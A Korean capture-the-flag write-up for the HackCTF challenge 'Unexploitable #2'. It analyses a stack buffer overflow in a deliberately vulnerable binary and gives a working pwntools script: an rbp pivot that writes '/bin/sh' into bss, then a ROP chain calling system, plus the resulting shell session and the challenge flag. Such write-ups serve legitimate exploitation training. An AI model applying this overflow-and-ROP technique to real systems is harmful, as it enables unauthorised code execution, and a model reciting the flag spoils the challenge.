# Unexploitable #2

---

우선 보호기법을 살펴보자.
```gdb
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

NX만 걸려있다.

`main()`의 코드를 살펴보자.
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+0h] [rbp-10h]

  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  fwrite("Hard RTL ha? You don't even have fflush@dynstr!\n", 1uLL, 0x30uLL, _bss_start);
  fgets(&s, 64, stdin);
  return 0;
}
```

0x40bytes를 입력받아서 bof취약점이 발생한다. Unexploitable #1에서는 문자열에서 fflush의 sh를 이용하여 쉘을 따냈었는데 이번에는 그러한 문자열이 보이지 않는다.

```
LOAD:0000000000400238	0000001C	C	/lib64/ld-linux-x86-64.so.2
LOAD:0000000000400399	0000000A	C	libc.so.6
LOAD:00000000004003A3	00000006	C	stdin
LOAD:00000000004003A9	00000006	C	fgets
LOAD:00000000004003AF	00000007	C	stdout
LOAD:00000000004003B6	00000007	C	system
LOAD:00000000004003BD	00000007	C	fwrite
LOAD:00000000004003C4	00000008	C	setvbuf
LOAD:00000000004003CC	00000012	C	__libc_start_main
LOAD:00000000004003DE	0000000F	C	__gmon_start__
LOAD:00000000004003ED	0000000C	C	GLIBC_2.2.5
.rodata:0000000000400798	0000001A	C	use this system gadget :D
.rodata:00000000004007B8	00000031	C	Hard RTL ha? You don't even have fflush@dynstr!\n
.eh_frame:000000000040088F	00000006	C	;*3$\"

```

"Hard RTL ha? You don't even have fflush@dynstr!\n" 문자열 중간에 0을 삽입하여 sh만 골라서 쓰려고 하였는데 해당 공간에는 NX때문에 쓰기권한이 없어서 불가능하다.

때문에 data영역에 "/bin/sh\x00"을 새로 쓴 다음 이를 인자로 넘겨주어 system함수를 실행시켜야 겠다. 다음과 같이 system함수의 plt는 주어져있다.

```c
int gift()
{
  return system("use this system gadget :D");
}
```

data영역에 "/bin/sh\x00" 문자열을 쓰는 것은 다음을 이용하면 된다.

```gdb
gdb-peda$ pd main
Dump of assembler code for function main:
...
   0x00000000004006ee <+98>:	mov    rdx,QWORD PTR [rip+0x20096b]        # 0x601060 <stdin@@GLIBC_2.2.5>
   0x00000000004006f5 <+105>:	lea    rax,[rbp-0x10]
   0x00000000004006f9 <+109>:	mov    esi,0x40
   0x00000000004006fe <+114>:	mov    rdi,rax
   0x0000000000400701 <+117>:	call   0x400540 <fgets@plt>
=> 0x0000000000400706 <+122>:	mov    eax,0x0
   0x000000000040070b <+127>:	leave  
   0x000000000040070c <+128>:	ret    
End of assembler dump.
```

`main()+98`부터 살펴보자. 만약에 rbp에 내가 원하는 주소+0x10을 넣을 수 있다면 rdi에 내가 원하는 주소를 넣을수 있기 때문에 원하는 공간에 원하는 값을 쓸 수 있게 된다. 그리고 이 rbp는 `main()`이 끝날 때 leave를 이용해서 조작할 수 있다.

**main\_98=0x4006ee**


또한 gift의 call system gadget과 bss영역의 주소, 그리고 pop rdi gadget이 필요하다. 이는 다음과 같다.

```gdb
gdb-peda$ pd gift
Dump of assembler code for function gift:
   0x0000000000400676 <+0>:	push   rbp
   0x0000000000400677 <+1>:	mov    rbp,rsp
   0x000000000040067a <+4>:	mov    edi,0x400798
   0x000000000040067f <+9>:	mov    eax,0x0
   0x0000000000400684 <+14>:	call   0x400520 <system@plt>
   0x0000000000400689 <+19>:	nop
   0x000000000040068a <+20>:	pop    rbp
   0x000000000040068b <+21>:	ret    
End of assembler dump.
```
**gift=0x400684**

```bash
sjy0175@sjy0175-VirtualBox:~/Desktop/HackCTF/Pwnable/30.Unexploitable_2$ objdump -h Unexploitable_2 | grep "bss"
 25 .bss          00000020  0000000000601050  0000000000601050  00001050  2**4
```

**bss=0x601050**

```bash
sjy0175@sjy0175-VirtualBox:~/Desktop/HackCTF/Pwnable/30.Unexploitable_2$ ROPgadget --binary Unexploitable_2 | grep "pop rdi"
0x0000000000400773 : pop rdi ; ret
```

**pop\_rdi\_ret=0x400773**


다음과 같은 익스코드를 통해서 쉘을 따낼 수 있었다.

```python
from pwn import*

#p=process('./Unexploitable_2')
p=remote('ctf.j0n9hyun.xyz',3029)
#gdb.attach(p)

main_98=0x4006ee
pop_rbp_ret=0x4005e0
gift=0x400684
bss=0x601050+0x900
pop_rdi_ret=0x400773

p.recvuntil('!\n')

payload='A'*16
payload+=p64(bss+0x10)
payload+=p64(main_98)

p.sendline(payload)

payload2='/bin/sh\x00'
payload2+='A'*16
payload2+=p64(pop_rdi_ret)
payload2+=p64(bss)
payload2+=p64(gift)

p.sendline(payload2)

p.interactive()
```

flag는 다음과 같다.

```bash
sjy0175@sjy0175-VirtualBox:~/Desktop/HackCTF/Pwnable/30.Unexploitable_2$ python ex.py
[+] Opening connection to ctf.j0n9hyun.xyz on port 3029: Done
[*] Switching to interactive mode
$ whoami
attack
$ cat flag
HackCTF{u5e_syst3m_t0_get_le4k}
```

**flag: 
HackCTF{u5e\_syst3m\_t0\_get\_le4k}**

